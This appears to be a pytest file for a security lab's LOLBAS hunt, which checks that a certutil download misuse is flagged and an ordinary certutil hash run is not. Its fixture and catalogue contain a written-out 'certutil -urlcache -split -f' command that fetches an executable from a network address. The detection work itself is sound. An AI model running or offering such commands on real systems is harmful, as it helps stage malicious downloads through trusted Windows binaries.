"""The LOLBAS hunt inside the hunts lab: night-tools' catalogue and matching (engine/labs/lolbas.py, read-only),
a hand-made catalogue file, a planted certutil download and an ordinary certutil run."""

import json
from datetime import timedelta

import pytest

from engine.labs import hunts, _huntdb as db
from engine.store import EventStore
from tests.labs import hunt_fixtures as fx

CATALOGUE = [
    {"Name": "Certutil.exe", "Description": "Windows binary used for handling certificates",
     "Commands": [{"Command": "certutil.exe -urlcache -split -f {REMOTEURL:.exe} {PATH:.exe}", "Category": "Download",
                   "Usecase": "Download and save an executable to disk", "MitreID": "T1105"}],
     "Full_Path": [{"Path": "C:\\Windows\\System32\\certutil.exe"}]},
]


@pytest.fixture()
def store(tmp_path, monkeypatch):
    path = fx.build(tmp_path / "events.db")
    b = fx.Builder()
    b.rid = 7000
    t = fx.T_END - timedelta(hours=2)
    b.start(t, fx.guid(901), "C:\\Windows\\System32\\certutil.exe", fx.guid(21), "C:\\Windows\\System32\\cmd.exe",
            cmd="certutil.exe -urlcache -split -f http://10.0.2.2:18765/x.exe C:\\Temp\\x.exe", original="CertUtil.exe")
    b.start(t + timedelta(minutes=1), fx.guid(902), "C:\\Windows\\System32\\certutil.exe", fx.guid(21),
            "C:\\Windows\\System32\\cmd.exe", cmd="certutil.exe -hashfile C:\\Temp\\x.exe SHA256", original="CertUtil.exe")
    s = EventStore(path)
    s.insert(b.records)
    s.close()
    cat = tmp_path / "lolbas.json"
    cat.write_text(json.dumps(CATALOGUE), encoding="utf-8")
    monkeypatch.setenv("ANALYSTLAB_LOLBAS_JSON", str(cat))          # night-tools' own switch for its data file
    fx.use_store(monkeypatch, path)
    return path


def test_a_documented_misuse_is_found_and_an_ordinary_run_is_not(store):
    con = db.connect(store)
    try:
        r = hunts.run_hunt(con, "lolbas", db.window(con, "24h"))
    finally:
        con.close()
    assert r["count"] == 1 and r["not_recorded"] is None
    row = r["rows"][0]["cells"]
    assert row["tool"] == "Certutil.exe" and row["technique"] == "T1105" and "Download" in row["use"]
    assert "-urlcache" in row["example"] and row["closeness"] == "4 of 4 switches"
    assert any("not a finding" in n for n in r["notes"])


def test_no_catalogue_is_said(store, monkeypatch, tmp_path):
    monkeypatch.setenv("ANALYSTLAB_LOLBAS_JSON", str(tmp_path / "missing.json"))
    con = db.connect(store)
    try:
        r = hunts.run_hunt(con, "lolbas", db.window(con, "24h"))
    finally:
        con.close()
    assert r["count"] == 0 and "not been downloaded" in r["not_recorded"]


def test_it_is_one_of_the_hunts():
    assert "lolbas" in [h["id"] for h in hunts.HUNTS]
